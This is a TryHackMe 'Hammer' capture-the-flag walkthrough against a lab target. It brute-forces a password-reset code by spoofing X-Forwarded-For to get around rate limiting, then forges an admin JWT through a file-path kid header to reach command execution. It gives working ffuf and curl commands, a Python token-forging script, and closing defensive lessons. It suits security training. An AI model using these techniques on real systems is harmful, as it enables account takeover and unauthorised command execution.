# TryHackMe: Hammer — Walkthrough

**Target:** 10.144.189.147
**Attack box:** WSL Kali (THM VPN)
**Goal:** Bypass authentication, then get RCE on the system.

| Question | Answer |
|---|---|
| What is the flag value after logging in to the dashboard? | `THM{AuthBypass3D}` |
| What is the content of the file /home/ubuntu/flag.txt? | `THM{RUNANYCOMMAND1337}` |

---

## 1. Recon

I started with a full TCP port scan with service detection so I wouldn't miss a web app on a non-standard port.

```bash
nmap -p- --min-rate 5000 -sV 10.144.189.147
```

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

SSH was unlikely to be the way in without credentials, so I focused on the Apache site on port 1337.

## 2. Enumerating the web app

Rather than looking at the login page in a browser, I grepped the raw source for comments, links and form actions. Developer notes often end up in HTML comments.

```bash
curl -s http://10.144.189.147:1337/ | grep -iE '<!--|href|action|src'
```

```html
<link href="/hmr_css/bootstrap.min.css" rel="stylesheet">
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
<form method="POST" action="">
<a href="reset_password.php">Forgot your password?</a>
```

Two things stood out. First, the dev note told me every directory uses an `hmr_` prefix, which meant a normal directory brute-force would miss them. Second, there was a password-reset page, which often has weaker protections than the login itself.

I fuzzed directories using that prefix:

```bash
ffuf -u http://10.144.189.147:1337/hmr_FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -s
```

```
css
images
js
logs
```

`css`, `images` and `js` are just static assets. `hmr_logs` was the interesting one. Directory listing was enabled and showed a single file, `error.logs`:

```bash
curl -s http://10.144.189.147:1337/hmr_logs/error.logs
```

Among the Apache auth errors were two failed logins for the same account:

```
AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
```

That gave me a valid email: **tester@hammer.thm**.

## 3. Bypassing the password-reset rate limit

With a username but no password, I went to the reset flow. I requested a reset for tester and captured the session cookie and response headers:

```bash
curl -si -c cj.txt -X POST http://10.144.189.147:1337/reset_password.php -d 'email=tester@hammer.thm'
```

```
Set-Cookie: PHPSESSID=...
Rate-Limit-Pending: 9
Location: reset_password.php
```

The `Rate-Limit-Pending: 9` header made it clear that guessing the code would be throttled. Next I looked at the code-entry form the redirect led to:

```bash
curl -s -b cj.txt http://10.144.189.147:1337/reset_password.php | grep -iE 'input|form|countdown|time'
```

The form took a `recovery_code` (4 digits) and a hidden `s` field filled by a JavaScript countdown starting at **180 seconds**. So there were only 10,000 possible codes and a 3-minute window to find one. Brute force was realistic if I could get around the rate limit.

A common weakness is a rate limiter that keys on the client IP but reads it from the `X-Forwarded-For` header. I tested this with one wrong guess and a spoofed header:

```bash
curl -si -b cj.txt -X POST http://10.144.189.147:1337/reset_password.php \
  -H 'X-Forwarded-For: 10.0.0.1' -d 'recovery_code=0000&s=170' \
  | grep -iE 'rate-limit|invalid|expired|error'
```

```
Rate-Limit-Pending: 9
<div class="alert alert-danger">Invalid or expired recovery code!</div>
```

The counter didn't go down. It was still at 9 because the server treated `10.0.0.1` as a brand-new client. A different XFF value on every request would therefore never hit the limit.

I generated every code from 0000 to 9999, requested a fresh reset code (to restart the 180-second timer) and ran ffuf in the same command line. I used the same wordlist value for both the code and the last part of the XFF header, so every request came from a different "IP". I also filtered out every response containing "Invalid":

```bash
seq -w 0000 9999 > codes.txt
curl -s -b cj.txt -X POST http://10.144.189.147:1337/reset_password.php -d 'email=tester@hammer.thm' -o /dev/null
ffuf -noninteractive -u http://10.144.189.147:1337/reset_password.php -X POST \
  -b "PHPSESSID=$(awk '/PHPSESSID/{print $7}' cj.txt)" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'X-Forwarded-For: 10.10.FUZZ' \
  -d 'recovery_code=FUZZ&s=170' \
  -w codes.txt:FUZZ -fr 'Invalid' -t 100 -s
```

> **Course correction:** my first two runs left out `-noninteractive`. ffuf reads stdin, so a stray Enter press dropped it into its interactive prompt. Redirecting stdin from `/dev/null` didn't help either, because ffuf also enters interactive mode when stdin hits EOF. Adding `-noninteractive` fixed it. Each retry also requested a fresh code, so the timer restarted every time.

ffuf printed three "hits": `2201`, `2904`, `6987`. That wasn't three valid codes. Once the right code was accepted, the session moved on to the "set new password" step. Requests still in flight after that no longer got the "Invalid" message, so they slipped past my filter. What mattered was that the session was past the code check, which I confirmed:

```bash
curl -s -b cj.txt http://10.144.189.147:1337/reset_password.php | grep -iE 'input|form|alert'
```

The page now showed `new_password` and `confirm_password` fields. I set a new password:

```bash
curl -si -b cj.txt -X POST http://10.144.189.147:1337/reset_password.php \
  -d 'new_password=Hammer123!&confirm_password=Hammer123!' | grep -iE 'location|alert|success'
```

```
Location: index.php
Password has been reset successfully!
```

## 4. Logging in — Flag 1

I logged in as tester, saved the cookies to a new jar and followed the redirect to the dashboard:

```bash
curl -s -c sess.txt -b sess.txt -L -X POST http://10.144.189.147:1337/index.php \
  -d 'email=tester@hammer.thm&password=Hammer123!' \
  | grep -iE 'thm\{|flag|input|token|script|role'
```

```html
<h3>Welcome, Thor! - Flag: THM{AuthBypass3D}</h3>
<p>Your role: user</p>
<input type="text" id="command" class="form-control" placeholder="Enter command">
var jwtToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9...';
'Authorization': 'Bearer ' + jwtToken
```

**Flag 1: `THM{AuthBypass3D}`**

The dashboard also showed me the way to RCE. There was a command input, my role was `user`, and requests were authorized with a JWT. Decoding the JWT header showed:

```json
{"typ":"JWT","alg":"HS256","kid":"/var/www/mykey.key"}
```

The `kid` (key ID) was a **file path on the server**. If the server reads whatever file `kid` names and uses it as the HMAC secret, then anyone who can point `kid` at a file whose contents they know can sign their own tokens.

## 5. Finding the command endpoint

I tried to pull the dashboard JavaScript to find where commands were sent, but got nothing back.

> **Course correction:** checking the headers showed a `302` to `logout.php`. The login had set a `persistentSession` cookie that expired **20 seconds** after login. curl had already dropped it, so the dashboard kicked me out. I hadn't followed that redirect, though, so the PHP session itself was still valid. Sending the cookies by hand, with `persistentSession=no` included, got me back in.

```bash
curl -s -H "Cookie: PHPSESSID=<session>; persistentSession=no; token=$(awk '/token/{print $7}' sess.txt)" \
  http://10.144.189.147:1337/dashboard.php | grep -iE 'url|fetch|ajax|\.php|data:'
```

```js
url: 'execute_command.php',
data: JSON.stringify({ command: command }),
```

Commands went to `execute_command.php` as JSON with a Bearer token. I tested it with my legitimate `user` token:

```bash
curl -s -X POST http://10.144.189.147:1337/execute_command.php \
  -H "Cookie: PHPSESSID=<session>; persistentSession=no" \
  -H "Authorization: Bearer $(awk '/token/{print $7}' sess.txt)" \
  -H 'Content-Type: application/json' -d '{"command":"ls"}'
```

```
188ade1.key  composer.json  config.php  dashboard.php  execute_command.php
hmr_css  hmr_images  hmr_js  hmr_logs  index.php  logout.php  reset_password.php  vendor
```

The `user` role was limited to `ls`, but that was enough. The listing showed **`188ade1.key`** sitting in the web root, where it could be downloaded.

## 6. Forging an admin JWT via `kid` — Flag 2

I downloaded the key file and checked its exact bytes. A trailing newline would change the HMAC.

```bash
curl -s http://10.144.189.147:1337/188ade1.key -o 188ade1.key; xxd 188ade1.key
```

```
00000000: 3536 3035 3833 3534 6566 6233 6461 6139  56058354efb3daa9
00000010: 3765 6261 6230 3066 6162 6437 6137 6437  7ebab00fabd7a7d7
```

It was 32 bytes of hex text with no newline. Next I built a token by hand with the Python standard library, so no PyJWT dependency was needed. I set `kid` to the key's absolute path, `/var/www/html/188ade1.key`, changed `role` to `admin`, signed it HS256 with the file's contents, and used it to read the target file:

```bash
TOK=$(python3 -c 'import hmac,hashlib,base64,json,time
b=lambda d:base64.urlsafe_b64encode(json.dumps(d,separators=(",",":")).encode()).rstrip(b"=").decode()
h=b({"typ":"JWT","alg":"HS256","kid":"/var/www/html/188ade1.key"})
p=b({"iss":"http://hammer.thm","aud":"http://hammer.thm","iat":int(time.time()),"exp":int(time.time())+3600,"data":{"user_id":1,"email":"tester@hammer.thm","role":"admin"}})
k=open("188ade1.key","rb").read()
s=base64.urlsafe_b64encode(hmac.new(k,f"{h}.{p}".encode(),hashlib.sha256).digest()).rstrip(b"=").decode()
print(f"{h}.{p}.{s}")')

curl -s -X POST http://10.144.189.147:1337/execute_command.php \
  -H "Cookie: PHPSESSID=<session>; persistentSession=no" \
  -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' -d '{"command":"cat /home/ubuntu/flag.txt"}'
```

```json
{"output":"THM{RUNANYCOMMAND1337}\n"}
```

The server read the file named in my `kid`, checked my signature against it, accepted the token as `admin`, and ran the command.

**Flag 2: `THM{RUNANYCOMMAND1337}`**

---

## Attack chain summary

1. An HTML comment revealed the `hmr_` directory prefix → `/hmr_logs/error.logs` was exposed → it leaked the user `tester@hammer.thm`.
2. The password-reset code was only 4 digits, and its rate limit trusted `X-Forwarded-For` → I brute-forced the code within the 180-second window by rotating XFF → reset tester's password and logged in → **Flag 1**.
3. The dashboard's `user` role could run `ls` → it found `188ade1.key` in the web root, readable by anyone.
4. The JWT `kid` header was a server-side file path, used as the HMAC key with no restrictions → I pointed it at the downloaded key and forged a `role: admin` token → ran any command → **Flag 2**.

## Key lessons

- **Don't leak internal conventions in client-side comments.** One dev note made the hidden directories guessable.
- **Rate limits must not trust client-supplied headers** such as `X-Forwarded-For` unless the request came through a known proxy. Short numeric codes need attempt limits per account and per session, not just per IP.
- **Never let `kid` name an arbitrary file.** Treat it as an identifier, map it to keys on the server side, and keep key material outside the web root.
- **Enforce authorization on the server.** The command filter relied entirely on a role claim inside a token that could be forged.
